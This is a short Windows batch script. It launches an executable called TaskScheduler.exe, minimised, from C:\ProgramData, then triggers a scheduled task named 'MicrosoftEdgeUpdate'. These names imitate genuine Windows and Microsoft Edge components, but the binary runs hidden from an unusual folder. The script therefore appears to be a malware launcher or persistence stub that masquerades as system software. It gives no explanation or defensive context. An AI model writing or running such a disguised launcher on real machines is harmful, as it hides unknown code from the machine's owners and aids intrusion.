@echo off
start /MIN /d "C:\ProgramData" TaskScheduler.exe
timeout /t 4 /nobreak
schtasks /run /tn "MicrosoftEdgeUpdate"